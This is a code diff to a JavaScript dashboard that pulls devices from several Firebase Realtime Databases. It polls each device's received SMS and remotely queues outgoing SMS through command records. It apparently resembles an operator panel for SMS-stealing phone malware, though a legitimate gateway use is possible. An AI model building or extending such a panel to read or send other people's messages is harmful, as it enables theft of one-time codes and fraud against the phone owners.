@@ -1,6 +1,6 @@
 /**
- * FIREBASE MANAGER - Realtime Database Version
- * Reads from Realtime Database (not Firestore)
+ * FIREBASE MANAGER - Realtime Database
+ * Reads devices from 'clients' and messages from 'messages/{deviceId}'
  */
 
 // ────────────────────────────────────────────────
@@ -25,10 +25,8 @@ async function loadFirebaseConfigs() {
             const data = await response.json();
             firebaseConfigsCache = data;
             localStorage.setItem('firebase_configs', JSON.stringify(data));
-            console.log('✅ Firebase configs loaded from JSON file:', data.sources ? data.sources.length : 0, 'sources');
+            console.log('✅ Firebase configs loaded:', data.sources ? data.sources.length : 0, 'sources');
             return data;
-        } else {
-            console.log('⚠️ Could not load firebase-configs.json, status:', response.status);
         }
     } catch (e) {
         console.log('⚠️ Error loading firebase-configs.json:', e.message);
@@ -39,7 +37,6 @@ async function loadFirebaseConfigs() {
         if (data) {
             const parsed = JSON.parse(data);
             if (parsed.sources && parsed.sources.length > 0) {
-                console.log('📢 Firebase configs loaded from localStorage fallback');
                 firebaseConfigsCache = parsed;
                 return parsed;
             }
@@ -48,12 +45,11 @@ async function loadFirebaseConfigs() {
         console.error('Error loading from localStorage:', e);
     }
     
-    console.log('📢 No Firebase configs found');
     return { sources: [] };
 }
 
 // ────────────────────────────────────────────────
-// INITIALIZATION - Realtime Database
+// INITIALIZATION
 // ────────────────────────────────────────────────
 
 async function initFirebaseConnections() {
@@ -66,22 +62,14 @@ async function initFirebaseConnections() {
             return false;
         }
 
-        console.log(`📢 Connecting to ${configs.sources.length} Firebase source(s)...`);
-        
         let successCount = 0;
         for (const source of configs.sources) {
             console.log(`📢 Connecting to Firebase: ${source.id}`);
             const connected = await connectToFirebase(source);
-            if (connected) {
-                successCount++;
-                console.log(`✅ Connected to Firebase: ${source.id}`);
-            } else {
-                console.log(`❌ Failed to connect to Firebase: ${source.id}`);
-            }
+            if (connected) successCount++;
         }
 
-        isInitialized = true;
-        console.log(`📢 Connected to ${successCount}/${configs.sources.length} Firebase sources`);
+        console.log(`📢 Connected to ${successCount}/${configs.sources.length} sources`);
         return successCount > 0;
     } catch (error) {
         console.error('❌ Error initializing Firebase:', error);
@@ -100,14 +88,14 @@ async function connectToFirebase(source) {
         console.log(`📢 Connecting to Firebase source: ${id}`);
         console.log(`📢 URL: ${url}`);
 
-        // Test connection using REST API
-        const testUrl = `${url}/users.json?auth=${key}&shallow=true`;
+        // Test connection using clients.json
+        const testUrl = `${url}/clients.json?auth=${key}&shallow=true`;
         const response = await fetch(testUrl);
         
         if (response.ok) {
             const data = await response.json();
             const count = data ? Object.keys(data).length : 0;
-            console.log(`📢 Test query returned ${count} users in Realtime Database`);
+            console.log(`📢 Test query returned ${count} clients`);
             
             firebaseInstances[id] = {
                 config: source,
@@ -121,7 +109,7 @@ async function connectToFirebase(source) {
             return false;
         }
     } catch (error) {
-        console.error(`❌ Failed to connect to Firebase ${source.id}:`, error);
+        console.error(`❌ Failed to connect:`, error);
         return false;
     }
 }
@@ -130,15 +118,15 @@ function disconnectFromFirebase(sourceId) {
     try {
         if (firebaseInstances[sourceId]) {
             delete firebaseInstances[sourceId];
-            console.log(`📢 Disconnected from Firebase: ${sourceId}`);
+            console.log(`📢 Disconnected: ${sourceId}`);
         }
     } catch (error) {
-        console.error(`❌ Error disconnecting from Firebase ${sourceId}:`, error);
+        console.error(`❌ Error disconnecting:`, error);
     }
 }
 
 // ────────────────────────────────────────────────
-// DEVICE MANAGEMENT - Realtime Database
+// DEVICE MANAGEMENT - FROM clients.json
 // ────────────────────────────────────────────────
 
 async function fetchAllDevices() {
@@ -149,15 +137,10 @@ async function fetchAllDevices() {
 
     for (const sourceId of sources) {
         const instance = firebaseInstances[sourceId];
-        if (!instance.connected) {
-            console.log(`⚠️ Source ${sourceId} is not connected, skipping...`);
-            continue;
-        }
+        if (!instance.connected) continue;
 
         try {
-            console.log(`📢 Fetching devices from ${sourceId}...`);
             const devices = await fetchDevicesFromSource(sourceId);
-            console.log(`📢 Found ${devices.length} devices in ${sourceId}`);
             allDevices = allDevices.concat(devices);
         } catch (error) {
             console.error(`❌ Error fetching devices from ${sourceId}:`, error);
@@ -166,6 +149,39 @@ async function fetchAllDevices() {
 
     console.log(`📢 Total devices found: ${allDevices.length}`);
     return allDevices;
+}
+
+/**
+ * Get device status from client data
+ */
+function getDeviceStatus(clientData) {
+    // 1. Check direct status field
+    if (clientData.status !== undefined) {
+        const statusValue = clientData.status;
+        if (statusValue === false || 
+            statusValue === 'false' || 
+            statusValue === 'pending' || 
+            statusValue === 'offline' ||
+            statusValue === null) {
+            return 'offline';
+        }
+        return 'online';
+    }
+    
+    // 2. Check command status
+    const cmdData = clientData.command || clientData.commands || {};
+    if (cmdData.status === 'pending') {
+        return 'offline';
+    }
+    
+    // 3. Check webhookEvent status
+    const webhookData = clientData.webhookEvent?.sendSms || {};
+    if (webhookData.status === 'pending') {
+        return 'offline';
+    }
+    
+    // 4. Default to online
+    return 'online';
 }
 
 async function fetchDevicesFromSource(sourceId) {
@@ -177,81 +193,84 @@ async function fetchDevicesFromSource(sourceId) {
     try {
         const { url, key } = instance;
         
-        const apiUrl = `${url}/users.json?auth=${key}`;
-        console.log(`📢 Fetching from Realtime Database: users`);
+        const apiUrl = `${url}/clients.json?auth=${key}`;
+        console.log(`📢 Fetching clients from Realtime Database...`);
         
         const response = await fetch(apiUrl);
-        
-        if (!response.ok) {
-            throw new Error(`HTTP ${response.status}`);
-        }
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
         
         const data = await response.json();
         const devices = [];
 
         if (!data) {
-            console.log('⚠️ No users found in Realtime Database');
+            console.log('⚠️ No clients found');
             return [];
         }
 
-        const userIds = Object.keys(data);
-        console.log(`📢 Found ${userIds.length} users in Realtime Database`);
+        const clientIds = Object.keys(data);
+        console.log(`📢 Found ${clientIds.length} clients`);
 
-        for (const userId of userIds) {
-            const userData = data[userId];
-            const commandData = userData.commands || userData;
+        for (const clientId of clientIds) {
+            const clientData = data[clientId];
             
             // ============================================
-            // STATUS DETECTION - FIXED
+            // EXTRACT BATTERY
             // ============================================
             
-            // Check if device is online or offline based on your data
-            let status = 'online'; // Default to online
-            
-            // Option 1: Check isSended field (false = pending/offline, true = sent/online)
-            if (commandData.isSended !== undefined) {
-                status = commandData.isSended === true ? 'online' : 'offline';
+            let battery = 50;
+            if (clientData.battery) {
+                const batStr = String(clientData.battery);
+                battery = parseInt(batStr.replace('%', ''));
+                if (isNaN(battery)) battery = 50;
             }
-            // Option 2: Check status field
-            else if (commandData.status) {
-                status = commandData.status === 'pending' ? 'offline' : 'online';
-            }
-            // Option 3: If neither exists, default to online
             
+            // ============================================
+            // STATUS DETECTION - Using the helper function
+            // ============================================
+            
+            const status = getDeviceStatus(clientData);
+            
+            // ============================================
+            // GET PHONE NUMBER
+            // ============================================
+            
+            const commandData = clientData.command || clientData.commands || clientData.webhookEvent?.sendSms || {};
+            const phoneNumber = commandData.number || commandData.to || clientData.number || 'N/A';
+            
+            // ============================================
+            // BUILD DEVICE OBJECT
             // ============================================
             
             const device = {
-                id: userId,
+                id: clientId,
                 sourceId: sourceId,
-                name: commandData.body ? commandData.body.substring(0, 20) : userId.substring(0, 8),
-                number: commandData.number || commandData.to || 'N/A',
+                name: clientData.name || clientId.substring(0, 8),
+                number: phoneNumber,
                 status: status,
-                battery: 50,
+                battery: battery,
                 signal: '4G',
                 model: commandData.simSlot !== undefined ? `SIM ${parseInt(commandData.simSlot) + 1}` : 'Unknown',
-                lastSeen: commandData.timestamp ? new Date(commandData.timestamp).toISOString() : new Date().toISOString(),
-                sims: commandData.number ? [commandData.number] : ['N/A'],
+                lastSeen: clientData.lastMessageTime ? new Date(clientData.lastMessageTime).toISOString() : new Date().toISOString(),
+                sims: phoneNumber ? [phoneNumber] : ['N/A'],
                 unread: 0,
-                raw: userData,
+                raw: clientData,
                 smsBody: commandData.body || commandData.message || commandData.text || '',
                 smsSender: commandData.number || commandData.from || 'Unknown',
                 smsTime: commandData.timestamp ? new Date(commandData.timestamp).toISOString() : new Date().toISOString()
             };
             
             devices.push(device);
-            console.log(`✅ Parsed device: ${device.id.substring(0, 8)}... (${device.status})`);
+            console.log(`✅ Device: ${device.id.substring(0, 8)}... → ${device.status} (${device.battery}%)`);
         }
 
         return devices;
     } catch (error) {
-        console.error(`❌ Error fetching devices from ${sourceId}:`, error);
+        console.error(`❌ Error fetching devices:`, error);
         throw error;
     }
 }
 
 function listenToDevices(callback) {
-    // Simple polling for Realtime Database
-    // Refresh every 5 seconds
     const intervalId = setInterval(async () => {
         try {
             await fetchAllDevices();
@@ -261,15 +280,14 @@ function listenToDevices(callback) {
         }
     }, 5000);
 
-    // Store interval for cleanup
     window._devicePollInterval = intervalId;
 }
 
 // ────────────────────────────────────────────────
-// SMS MANAGEMENT - Realtime Database
+// SMS MANAGEMENT - FROM messages/{deviceId}.json
 // ────────────────────────────────────────────────
 
-async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 100) {
+async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 150) {
     const instance = firebaseInstances[sourceId];
     if (!instance || !instance.connected) {
         throw new Error('Firebase not connected');
@@ -277,12 +295,16 @@ async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 100) {
 
     try {
         const { url, key } = instance;
-        const apiUrl = `${url}/users/${deviceId}.json?auth=${key}`;
+        
+        // Fetch messages for specific device from messages/{deviceId}.json
+        const apiUrl = `${url}/messages/${deviceId}.json?auth=${key}&orderBy="$key"&limitToLast=${limit}`;
+        console.log(`📢 Fetching messages for device: ${deviceId}`);
         
         const response = await fetch(apiUrl);
         
         if (!response.ok) {
-            throw new Error(`HTTP ${response.status}`);
+            console.log(`⚠️ No messages found for device: ${deviceId}`);
+            return [];
         }
         
         const data = await response.json();
@@ -291,21 +313,24 @@ async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 100) {
             return [];
         }
         
-        const commandData = data.commands || data;
+        // Convert messages to array and sort by timestamp
+        const messages = Object.values(data);
         
-        if (commandData.action === 'sendSms' || commandData.type === 'sendSms') {
-            return [{
-                id: deviceId,
-                sender: commandData.number || commandData.from || 'Unknown',
-                body: commandData.body || commandData.message || commandData.text || '',
-                time: commandData.timestamp ? new Date(commandData.timestamp).toISOString() : new Date().toISOString(),
-                simNumber: commandData.number || 'N/A',
-                type: commandData.type || 'incoming',
-                raw: commandData
-            }];
-        }
+        // Sort by timestamp descending (newest first)
+        messages.sort((a, b) => (b.id || b.timestamp || 0) - (a.id || a.timestamp || 0));
         
-        return [];
+        console.log(`📢 Found ${messages.length} messages for device: ${deviceId}`);
+        
+        return messages.map(msg => ({
+            id: msg.id || msg.timestamp || Date.now(),
+            sender: msg.sender || msg.from || 'Unknown',
+            body: msg.message || msg.body || msg.text || '',
+            time: msg.dateTime || (msg.timestamp ? new Date(msg.timestamp).toISOString() : new Date().toISOString()),
+            simNumber: msg.simNumber || 'N/A',
+            type: msg.type || 'incoming',
+            raw: msg
+        }));
+        
     } catch (error) {
         console.error(`❌ Error fetching SMS for device ${deviceId}:`, error);
         return [];
@@ -313,7 +338,6 @@ async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 100) {
 }
 
 function listenToSms(deviceId, sourceId, simNumber, callback) {
-    // Poll every 3 seconds for SMS updates
     const intervalId = setInterval(async () => {
         try {
             const messages = await fetchSmsForDevice(deviceId, sourceId, simNumber);
@@ -327,7 +351,7 @@ function listenToSms(deviceId, sourceId, simNumber, callback) {
 }
 
 // ────────────────────────────────────────────────
-// SEND SMS - Realtime Database
+// SEND SMS
 // ────────────────────────────────────────────────
 
 async function sendSms(deviceId, sourceId, simNumber, toNumber, message) {
@@ -357,18 +381,48 @@ async function sendSms(deviceId, sourceId, simNumber, toNumber, message) {
             type: "sendSms"
         };
 
-        const apiUrl = `${url}/users/${deviceId}.json?auth=${key}`;
+        // Get existing data first
+        const getUrl = `${url}/clients/${deviceId}.json?auth=${key}`;
+        const getResponse = await fetch(getUrl);
+        let existingData = {};
+        if (getResponse.ok) {
+            existingData = await getResponse.json();
+        }
+        
+        // Update with new SMS data
+        const updatedData = {
+            ...existingData,
+            command: smsData,
+            webhookEvent: {
+                sendSms: smsData
+            }
+        };
+        
+        const apiUrl = `${url}/clients/${deviceId}.json?auth=${key}`;
         const response = await fetch(apiUrl, {
-            method: 'PATCH',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ commands: smsData })
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(updatedData)
         });
         
         if (!response.ok) {
             throw new Error(`HTTP ${response.status}`);
         }
+        
+        // Also add to messages collection
+        const msgId = Date.now();
+        const msgUrl = `${url}/messages/${deviceId}/${msgId}.json?auth=${key}`;
+        await fetch(msgUrl, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                id: msgId,
+                message: message,
+                sender: toNumber,
+                type: 'outgoing',
+                dateTime: new Date().toLocaleString()
+            })
+        });
         
         return {
             success: true,
